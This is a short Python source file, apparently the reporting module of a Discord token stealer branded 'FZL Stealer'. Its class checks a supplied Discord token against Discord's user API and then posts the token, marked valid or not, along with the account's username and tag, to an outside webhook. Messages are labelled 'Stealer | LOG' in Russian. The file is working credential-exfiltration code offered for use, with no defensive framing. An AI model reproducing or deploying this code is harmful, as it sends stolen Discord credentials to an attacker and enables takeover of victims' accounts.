class helper():
    def __init__(self, webhook, token):
        self.webhook = webhook
        self.token = token
    
    def start(self):
        import requests as rq
        headers = {'Authorization': self.token}
        stata = rq.get('https://discord.com/api/users/@me', headers=headers)
        if int(stata.status_code) == 200:
            stata = rq.get('https://discord.com/api/users/@me', headers=headers).json()
            nick = stata['username']
            tag = stata['discriminator']
            message = {
                "username": "FZL API | Stealer",
                "avatar_url": "https://psj.ru/images/news/2020-07-08/hackers_920%D1%85613.jpg",
                "content": "",
                "embeds": [
                {
                 "title": "FZL Stealer | LOG",
                 "color": 16711680,
                 "description": f"Токен: `{self.token}`\nВалид: `да` :white_check_mark:\nНик-тег: `{nick}#{tag}`",
                 "timestamp": "",
                 "author": {},
                 "image": {},
                 "thumbnail": {},
                 "footer": {},
                 "fields": []
                }
               ],
               "components": []
               }
            rq.post(self.webhook, json=message)
        else:
            message = {
                "username": "FZL API | Stealer",
                "avatar_url": "https://psj.ru/images/news/2020-07-08/hackers_920%D1%85613.jpg",
                "content": "",
                "embeds": [
                {
                 "title": "FZL Stealer | LOG",
                 "color": 16711680,
                 "description": f"Токен: `{self.token}`\nВалид: `нет` :x:",
                 "timestamp": "",
                 "author": {},
                 "image": {},
                 "thumbnail": {},
                 "footer": {},
                 "fields": []
                }
               ],
               "components": []
               }
            rq.post(self.webhook, json=message)